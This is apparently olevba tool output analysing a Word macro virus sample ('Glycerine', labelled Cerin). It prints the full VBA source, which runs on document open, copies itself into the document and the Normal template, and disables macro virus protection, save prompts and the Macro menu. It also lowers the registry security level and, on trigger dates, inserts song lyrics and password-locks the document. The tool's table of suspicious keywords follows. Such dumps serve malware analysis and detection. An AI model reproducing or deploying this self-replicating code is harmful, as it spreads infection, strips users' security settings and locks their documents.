olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cerin-9842b36c1797bb9fba3b82f1725deae7284eaece
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Glycerine.cls 
in file: Virus.MSWord.Cerin-9842b36c1797bb9fba3b82f1725deae7284eaece - OLE stream: 'Macros/VBA/Glycerine'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
 On Error Resume Next
  myname = "Glycerine"
  yup = 0: nope = 1: Rage = "c" & Int((Rnd * 1000) + 2)
  Set itzme = Glycerine.VBProject.VBComponents(nope).codemodule
  Set ab = ActiveDocument.VBProject.VBComponents(nope): Set ab1 = ab.codemodule
  Set cd = NormalTemplate.VBProject.VBComponents(nope): Set cd1 = cd.codemodule
  mycode = itzme.lines(nope, itzme.countoflines)
  If ab1.countoflines >= (99 * yup) And ab.Name <> myname Then
  With ab1
   .deletelines nope, .countoflines
   .addfromstring mycode: ab.Name = myname
  End With
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
  End If
  If cd1.countoflines >= (99 * yup) And cd.Name <> myname Then
  With cd1
   .deletelines nope, .countoflines
   .addfromstring mycode: cd.Name = myname
  End With
  End If
  With Application.Options
   .VirusProtection = yup
   .SaveNormalPrompt = yup
   .ConfirmConversions = yup
  End With
  CommandBars("Tools").Controls("Macro").Enabled = yup
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   CommandBars("Macro").Controls("Security...").Enabled = yup
  End If
  If Day(Now) = 31 And Month(Now) = 7 Or Day(Now) = 6 And Month(Now) = 4 Then
   MsgBox "I Love You and Hate You." & vbCr & "You've given so much pleasure," & vbCr & "And caused so much pain." & vbCr & "Now to share the wealth!!", vbOKOnly, "Glycerine"
  With Selection
     .TypeText "Glycerine" & vbCr
     .TypeText " " & vbCr
     .TypeText " " & vbCr
     .TypeText " " & vbCr
     .TypeText "Must be your skin I'm sinking in" & vbCr
     .TypeText "Must be for real 'cause now I can feel" & vbCr
     .TypeText "And I didn't mind it's not my kind" & vbCr
     .TypeText "Not my time to wonder why" & vbCr
     .TypeText "everything 's gone white" & vbCr
     .TypeText "And everything's grey" & vbCr
     .TypeText "Now you 're here now you're away" & vbCr
     .TypeText "I Don 't want this remember that" & vbCr
     .TypeText "I 'll never forget where you're at" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Glycerine" & vbCr
     .TypeText " " & vbCr
     .TypeText "I 'm never alone" & vbCr
     .TypeText "I 'm alone all the time" & vbCr
     .TypeText "Are you at one" & vbCr
     .TypeText "Or do you lie" & vbCr
     .TypeText "We live in a wheel" & vbCr
     .TypeText "Where everyone steals" & vbCr
     .TypeText "But when we rise" & vbCr
     .TypeText "It 's like strawberry fields" & vbCr
     .TypeText " " & vbCr
     .TypeText "If I treated you bad" & vbCr
     .TypeText "You bruise my face" & vbCr
     .TypeText "couldn 't love you more" & vbCr
     .TypeText "You got a beautiful taste" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Could have been easier on you" & vbCr
     .TypeText "I couldn 't change though I wanted to" & vbCr
     .TypeText "Should have been easier by three" & vbCr
     .TypeText "Our old friend fear and you and me" & vbCr
     .TypeText "Glycerine (Repeat)" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Glycerine (Repeat)" & vbCr
     .TypeText " " & vbCr
     .TypeText "Bad mood whine again" & vbCr
     .TypeText "Bad mood whine again" & vbCr
     .TypeText "As she falls around me" & vbCr
     .TypeText " " & vbCr
     .TypeText "I needed you more" & vbCr
     .TypeText "When we wanted us less" & vbCr
     .TypeText "I could not kiss just regress" & vbCr
     .TypeText "It might just be" & vbCr
     .TypeText "Clear simple And plain" & vbCr
     .TypeText "That 's just fine" & vbCr
     .TypeText "That 's just one of my names" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Could have been easier on you" & vbCr
     .TypeText "Glycerine" & vbCr
  End With
  ActiveDocument.Protect Password:=Rage, NoReset:=False, Type:=wdAllowOnlyComments
  ActiveDocument.Save
  End If
End Sub
' Glycerine by Psyclone X (c) 2001
' This goes out to my baby love you
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

